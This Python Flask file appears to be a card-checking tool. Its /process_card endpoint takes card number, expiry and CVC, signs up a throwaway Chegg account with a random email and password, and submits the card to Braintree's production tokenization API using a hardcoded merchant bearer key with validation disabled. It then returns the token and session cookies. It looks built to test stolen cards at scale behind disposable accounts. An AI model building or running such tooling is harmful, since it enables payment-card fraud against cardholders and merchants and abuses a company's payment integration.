from flask import Flask, jsonify, request
import requests
import json
import string
import re
import random
import os
from flask import Flask, jsonify, request

app = Flask(__name__)

# Proxy setup


# Function to extract card details
def pregs(card_info):
    arrays = re.findall(r'[0-9]+', card_info)
    return arrays

# Function to generate random email
def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "hotmail.com"]
    letters = string.ascii_lowercase
    email = ''.join(random.choice(letters) for i in range(10)) + "@" + random.choice(domains)
    return email

# Function to generate random password
def generate_random_password():
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for i in range(12))
    return password

@app.route('/process_card', methods=['POST'])
def process_card():
    data = request.json
    card_info = data.get('card')
    
    # Extract card details
    arrs = pregs(card_info)
    cc = arrs[0]
    month = arrs[1]
    year = arrs[2]
    cvc = arrs[3]

    session = requests.Session()

    # Signup process
    url_signup = "https://gateway.chegg.com/auth-gate/"
    email = generate_random_email()
    password = generate_random_password()

    payload_signup = json.dumps({
        "query": "mutation Signup($userCredentials: UserCredentials!, $userProfile: UserProfile!, $clientId: String!) {\n  signUpUser(\n    userCredentials: $userCredentials\n    userProfile: $userProfile\n    clientId: $clientId\n  ) {\n    tokens {\n      idToken\n      accessToken\n      expires\n    }\n    encryptedEmail\n    encryptedCheggId\n    uuid\n  }\n}\n",
        "variables": {
            "userCredentials": {
                "email": email,
                "password": password
            },
            "userProfile": {
                "sourceProduct": "core|CHGG",
                "sourcePage": "chegg|payments"
            },
            "clientId": "CHGG"
        },
        "operationName": "Signup"
    })

    headers_signup = {
        'authority': 'gateway.chegg.com',
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://www.chegg.com',
        'referer': 'https://www.chegg.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }

    # Make the POST request to sign up
    response_signup = session.post(url_signup, headers=headers_signup, data=payload_signup)

    if response_signup.status_code == 200:
        # Success: proceed with the rest of the logic
        ...
    else:
        # Log the full response body for debugging
        print("Signup failed with status code:", response_signup.status_code)
        print("Response text:", response_signup.text)
        return {"error": "Signup failed", "details": response_signup.text}
    if response_signup.status_code == 200:
        # Now navigate to the payments page (simulated)
        url_payments = "https://www.chegg.com/my/payments"
        session.get(url_payments, headers=headers_signup)

        # Wait for the specific request to the GraphQL endpoint
        url_graphql = "https://gateway.chegg.com/me-web-bff/graphql"
        session.get(url_graphql, headers=headers_signup)

        # Fetch and format cookies from the response
        cookies = session.cookies
        cookies_value = '; '.join([f"{cookie.name}={cookie.value}" for cookie in cookies])

        # Tokenization process
        url_tokenize = "https://payments.braintree-api.com/graphql"
        payload_tokenize = json.dumps({
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "e67551a3-cb40-47a7-a878-f9bd68d4716d"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": month,
                        "expirationYear": year,
                        "cvv": cvc,
                        "cardholderName": "Proshno gaming",
                        "billingAddress": {
                            "countryCodeAlpha2": "US",
                            "locality": "Knoxville",
                            "region": "Tennessee",
                            "postalCode": "37932"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        })

        headers_tokenize = {
            'authority': 'payments.braintree-api.com',
            'method': 'POST',
            'accept': '*/*',
            'authorization': 'Bearer production_6mhyzqmw_k588b3w67tw7q2zs',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
        }

        response_tokenize = session.post(url_tokenize, headers=headers_tokenize, data=payload_tokenize)
        response_json = response_tokenize.json()

        # Fetch the token
        tokenID = response_json['data']['tokenizeCreditCard']['token']

        return jsonify({
            "cookies": cookies_value,
            "token": tokenID
        })
    else:
        return jsonify({"error": "Signup failed"}), 400


if __name__ == '__main__':
    # Get the port from the environment variable or default to 5000
    port = int(os.environ.get('PORT', 5000))
    # Run the Flask app on the specified port
    app.run(host='0.0.0.0', port=port)
